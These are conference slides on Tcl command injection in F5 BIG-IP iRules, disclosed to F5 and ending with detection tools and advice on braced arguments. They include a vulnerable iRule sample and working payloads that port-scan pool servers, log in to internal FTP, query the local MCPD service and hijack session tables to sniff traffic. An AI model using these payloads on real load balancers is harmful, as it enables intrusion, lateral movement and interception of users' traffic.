COMMAND INJECTION IN IRULES LOADBALANCER
SCRIPTS
A story about how TCL interpretation works in F5 iRules and how it can be detected or exploited

WHOAM IAND THANKS
Big thanks to my fellow researchers
 Jesper Blomström  Pasi Saarinen  William Söderberg  Olle Segerdahl
Twitter @kuggofficial
Big thanks to David and Aaron at F5 SIRT for a good response https://support.f5.com/csp/article/K15650046

F-SECURE IS ONE OF THE LEADING CYBER SECURITY CONSULTING PROVIDERS GLOBALLY

CAPABILITY
250+
Technical consultants

ACCREDITATIONS
12
Internationally recognised

THOUGHT LEADERSHIP
300+
Publications & research released annually

CLIENTS
250+
Clients

TECHNICAL SECURITY SERVICES

Red teaming

Security assessments

RISK & SECURITY MANAGEMENT

Audit & analysis

Development programs

CYBER INTELLIGENCE

Intelligence services

Intelligence platform

Incident Management &
Forensics
Coaching & exercises

Hardware security assessments

LOAD BALANCERS

THE F5 PRODUCTS I WILL TALKABOUT

 Can store and handle multiple sessions for backend servers
 Customers write their own iRules to define the load balancer behaviour
 https://devcentral.f5.com is used as a "stackoverflow for iRules"
 Application fluency for all major protocols.  Highly programmable through iRules, iRules LX and
Traffic Policies  Deployable as software and hardware  Scalable to Tb/s of performance and highly available for
both data and control plane  WAF functionality

Internet
TLS BIG-IP Load balancer

HTTP Server 1

HTTP Server 2

CACHING IRULE EXAMPLE

Browser

Loadbalancer GET /favicon.ico
iRule
HTTP 200 OK

Backend webservers

FORWARDING EXAMPLE

Browser

Loadbalancer GET /index.html

Backend webservers

iRule

GET /index.html HTTP 200 OK

HTTP 200 OK

THE IRULE LANGUAGE
 A fork of TCL 8.4
 New features in TCL >8.4 are not introduced in iRule
 iRule has introduced a group of simplifications and exceptions to TCL
 Return oriented programming (with optional exception handling)

TCL / IRULE BASICS
 iRules determine where a given HTTP request is forwarded to, based on a programmed logic
 The HTTP request header and body is parsed by the F5 iRule engine  The system admnistrator writes F5 iRule code to handle requests
 Example "catch-all" redirect iRule:
when HTTP_REQUEST { HTTP::redirect "/helloworld.html"
}

HOW TO SPOT THESE LOAD BALANCERS IN THE WILD
HTTP header include
 Server: BigIP
Found in redirects Found in favicon.ico responses
HTTP/1.0 302 Found Location: /helloworld.html Server: BigIP Connection: close Content-Type: Text/html Content-Length: 0

TCL SUPPORTS ARGUMENT SUBSTITUTION

COMMAND ARGUMENTS
 An argument is evaluated by breaking down words and substituting its meaning depending on the string enclosure

1. command "$arg1" "$arg2" 2. command [$arg1] [$arg2] 3. command {$arg1} {$arg2} 4. command $arg1 $arg2

# Quoted arguments # Bracketed arguments # Braced arguments # Unquoted arguments

QUOTED EVALUATION AND COMMAND SUBSTITUTION
Inside double quotes ("): "Command substitution, variable substitution, and backslash substitution are performed on the characters between the quotes ..."
Inside brackets []: "If a word contains an open bracket ("[") then TCL performs command substitution."
 Like backticks ` in /bin/sh

THIS ISACOMMAND INJECTION
Bart: Is Al there? Moe: Al? Bart: Yeah, Al. Last name Caholic? Moe: Hold on, I'll check. Phone call for Al... Al Caholic. Is there an Al Caholic here? (The guys in the pub cheer.)
15

ARGSAND BODY UNQUOTED COMMAND SUBSTITUTION
The body part of command invocation is a list of commands to execute if a condition is met
command ?arg? ?body? 1. after 1 $body 2. while 1 $body 3. if 1 $body 4. switch 1 1 $body
In these cases the value of $body will be command substituted regardless of quote unless braces are used

PRIORART: COMMAND INJECTION IN TCL 8.4
TCL will expand the value of a command before assignment if it is put inside quotes https://wiki.tcl-lang.org/page/Injection+Attack
set variable {This is a string} catch "puts $variable" When double quotes are used, TCL will substitute the content of the variables and commands Try: set variable {[error PWNED!]}
When the contents of $variable is substituted by TCL it will be passed as [error PWNED!] to catch and executed. This is called double substitution

BREAKING DOWN EXECUTION
1. The word catch is resolved as a command with a ?body? argument
2. Arguments are evaluated by the TCL interpreter according to the dodecalogue, including expansion of [ ] " "{ }
3. Any code within arguments starting with [ will be executed by catch

catch "puts $variable" catch puts [error PWNED!] error PWNED!

LIST OF BUILT-IN COMMANDS THAT CAN PERFORM COMMAND EVALUATION

 after  catch  eval  expr  for  foreach  history  if

 proc  cpu  string match  interp  namespace eval  namespace inscope  source  switch

 subst  time  try  uplevel  while  trace  list

DIRECT EVALUATION: EVAL, SUBST OR EXPR

eval, a builtin Tcl command, interprets its arguments as a script, which it then evaluates.
eval arg ?arg ...?

subst - Perform backslash, command, and variable substitutions.
subst ?nobackslashes? ?nocommands? ?novariables? String

expr, a builtin Tcl command, interprets its arguments as a mathematical expression, which it then evaluates.
expr arg ?arg ...?

IRULE BASED ON HSSR

Browser GET /index.html

Loadbalancer

Backend webservers

HTTP 200 OK

iRule

GET /index.html
HTTP 200 OK
when HTTP_REQUEST { if {[HTTP::uri] starts_with "/index.html"} { set lang [HTTP::header {Accept-Language}] set uri http://$lang.cdn.example.com/index.html set status [call /Common/HSSR::http_req -uri $uri] }
}

HOW HSSR USES OUR $URI

EXPLOITATION
1. Identify an input field that is command substituted in iRule
Input Tcl strings in fields and header names Look for indications that the code was executed
2. Test injection location using the info command
3. Identify external resources to pivot to permanent access

DEMO TIME

TAKING IT FURTHER
How do we get persistent access?

GAINING PERMANENT ACCESS USING
"TABLE"

 A session table is a distributed and replicated key value store
 Commonly used to store cookie values
Notably used to avoid paying for the APM module
 Magically synchronized between instances using load balancing
Can be used to pivot access on multiple instances

HACKING THE SESSION TABLE

 With command injection it's possible to overwrite any table value
 table set  table lookup  table add  table replace
 Overwriting another (or all) user session enable specifically executing code for a target user
 Possible to sniff all http(s) traffic for any authenticated user

TABLE DEMO: HOSTED MITM

ALOOKAT THE CODE IN THE BIG-IP EDITOR

POST EXPLOITATION POSSIBILITIES

 Scan internal network
 Scan localhost
 Attack internal resources using the BIG-IP F5 as a pivot

PAYLOAD 1
Exposing the pool (backend) servers
active_nodes -list [LB::server pool]

PORTSCAN THE POOL SERVERS
foreach p {21 80 135 389 443 445}{catch {set c [connect 192.168.200.5:$p];append r $p "\topen\n";close $c}};TCP::respond $r

LOGGING IN TO THE FTP SERVICE
catch {set c [connect 192.168.200.5:21]; recv -timeout 200 $c d; recv -timeout 200 $c d; send -timeout 200 $c "USER anonymous\r"; recv -timeout 200 $c d; send -timeout 200 $c "PASS a@a.com\r"; recv -timeout 200 $c d;};
close $c;TCP::respond $d

ATTACK CHAIN

Browser

GET / index.html

Loadbalancer

Protected webservers

iRule

FTP request FTP response

230 User logged in.

PAYLOAD 2 PORTSCAN LOCALHOST

PAYLOAD 3 QUERYALL MCPD SYSTEM MODULE
set c [connect 127.0.0.1:6666];send $c {%00%00%00%16%00%00%00%3f%00%00%00%00%00%00%00%02%0b%65%00%0d%00%00%00%0c%21%e0%00 %0d%00%00%00%02%00%00%00%00%00%00};recv -timeout 10000 $c d;TCP::respond $d

MCPD EXPLANATION
%00%00%00%16 SIZE %00%00%00%3f SEQUENCE %00%00%00%00 REQUEST-ID %00%00%00%02 FLAG %0b%65 KEY (Query All) %00%0d TYPE %00%00%00%0c ATTRIBUTE SIZE %21%e0 ATTRIBUTE NAME (System Module) %00%0d%00%00%00%02%00%00%00%00 (Attribute data) %00%00 END OF MESSAGE

LIST USERSAND PRIVILEGES

LIST LOCAL TMSH SHELL COMMANDS (BEYOND IRULE)

ATTACK CHAIN
1. iRule injection access 2. Query MCPD 3. Mcpd response 4. Execute MCPD tmsh command with
Tcl injection 5. ... 6. Local privilegies

DETECTION

SCANNING FOR COMMAND INJECTION
WITH TCLSCAN

 Automated tool to find quoted and unquoted arguments
 It's unmaintained Rust so I had to fix it
 Finds 80% of known injection vulnerabilities
 Get the code: https://github.com/kugg/tclscan

AUTOMATED TESTING USING IRULEDETECTOR.PY
 Automated iRule injection detector scanner for Burp Suite  The tool will substitute every available input field with a Tcl injection and
measure the result  Download iruledetector.py in the bapp-store

UNIT TESTING IRULE CODE USING TESTCL

 Get the code: https://github.com/landro/testcl
 Unit testing framework for iRule code
 Community driven, lacks complex support
 I added cookie support
 Good for unit testing code and finding logical vulnerabilities

SUMMARY
 Tcl is an old and loosely defined language
Easy to fool Hard to get variable assignment and substitution right
 Avoid the use of eval, subst and expr  Take care to use {bracing} of ?body?
arguments.  Use iruledetector.py in burp to find
vulnerabilities  Use tclscan to review code  Use testcl to test your iRule logic  Do manual third party code reviews

THANK YOU

ATTACK CHAIN
1. iRule injection access 2. Query MCPD 3. Mcpd response 4. Execute MCPD tmsh command with
Tcl injection 5. ... 6. Local privilegies

Browser

Loadbalancer

1. iRule injection (mcpd) 3. mcpd response
4. Irule with tmsh 5. Tcl shell response

iRule iRule

2. mcpd query

